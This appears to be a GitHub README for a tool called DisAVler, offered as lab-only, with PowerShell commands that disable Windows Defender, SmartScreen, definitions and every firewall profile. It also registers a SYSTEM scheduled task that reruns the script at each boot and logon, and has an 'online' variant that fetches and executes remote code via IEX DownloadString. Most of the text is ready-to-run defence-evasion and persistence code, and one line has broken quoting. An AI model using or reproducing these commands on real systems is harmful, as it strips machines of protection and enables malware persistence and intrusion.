🧑‍🎓 This **_naive_** repo is created for educational purposes only [_and only for me!_]

Why **_naive_** ? Because if **_App & browser control's Check apps and files_** function is enabled you won't go far! 🤷‍♂️ 

Why I created it? If you are in the same boat with me, _having a lab Windows VM that restarts WinDefend features every time on StartUp_, then you are at the right time, in the right place [probably] :)

Global connection NOT RECOMMENDED! ❌

# DisAVler
🚮 This is the repository that disables Windows Defender and its features on startup.

# AV Disabler [disAVler.txt]
## Offline
### Prepare the disablers [having DisAVler.txt on the host]:
Download the `disAVler.txt` file from repository into `C:\Windows\Tasks\`.

Or Execute this sh1t with PS [offline]:
```
echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Type DWord -Value 1;' > C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Domain,Private,Public -NotifyOnListen 0 -ErrorAction SilentlyContinue;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;' >> C:\Windows\Tasks\DisAVler.txt;
echo '$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
$propertyName = "Enabled"
$desiredValue = 0
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
};' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Domain,Private,Public -NotifyOnListen False;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -UILockdown $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'cd "C:\Program Files\Windows Defender";' >> C:\Windows\Tasks\DisAVler.txt;
echo '.\MpCmdRun.exe -removedefinitions -all;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Remove-MpPreference;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableRealtimeMonitoring $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -SubmitSamplesConsent 2;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableArchiveScanning $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableEmailScanning $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableScriptScanning $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableIntrusionPreventionSystem $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableIOAVProtection $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableBehaviorMonitoring $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableBlockAtFirstSeen $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Public -Enabled False;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Private -Enabled False;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-NetFirewallProfile -Profile Domain -Enabled False;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -MAPSReporting 0;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -PUAProtection 0;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-MpPreference -DisableCloudProtection $true;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Stop-Service -Name WinDefend -Force;' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-Service -Name WinDefend -StartupType Disabled;' >> C:\Windows\Tasks\DisAVler.txt;
echo '$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";' >> C:\Windows\Tasks\DisAVler.txt;
echo '$propertyName = "SmartScreenEnabled"; >> C:\Windows\Tasks\DisAVler.txt;' >> C:\Windows\Tasks\DisAVler.txt;
echo '$desiredValue = "Off";' >> C:\Windows\Tasks\DisAVler.txt;
echo 'if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
};' >> C:\Windows\Tasks\DisAVler.txt;
echo 'Set-ItemProperty -Path $regPath -Name $propertyName -Value $desiredValue -Force;' >> C:\Windows\Tasks\DisAVler.txt;
```

### Setup Task Scheduler
Execute with PS for offline mode:
```
$Action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument '-Command "GET-Content -Raw C:\Windows\Tasks\DisAVler.txt | IEX"' `
    -WorkingDirectory "C:\Windows\System32"

$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$TriggerLogon   = New-ScheduledTaskTrigger -AtLogOn

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable

$Task = New-ScheduledTask -Action $Action -Trigger $TriggerStartup, $TriggerLogon -Principal $Principal -Settings $Settings

Register-ScheduledTask -TaskName "DisAVlerOnBoot" -InputObject $Task
```


## Online
Execute with PS for online [having DisAVler.txt on another host]. 

Change https://raw.githubusercontent.com/DRAGOWN/DisAVling/refs/heads/main/DisAVler-Out0.txt with your hosted file:
```
$Action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument '-Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DRAGOWN/DisAVling/refs/heads/main/DisAVler-Out0.txt')"' `
    -WorkingDirectory "C:\Windows\System32"

$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$TriggerLogon   = New-ScheduledTaskTrigger -AtLogOn

$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable

$Task = New-ScheduledTask -Action $Action -Trigger $TriggerStartup, $TriggerLogon -Principal $Principal -Settings $Settings

Register-ScheduledTask -TaskName "DisAVlerOnBoot" -InputObject $Task
```

# Restore configurations
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DRAGOWN/DisAVling/refs/heads/main/EnAVler.txt')"
```

### _Win or lose, blame yourself, if anything happens to you, because you are still alive_ 🫶🏻
<!-- [Giorgi Dograshvili]([url](https://www.linkedin.com/in/giorgi-dograshvili)) -->
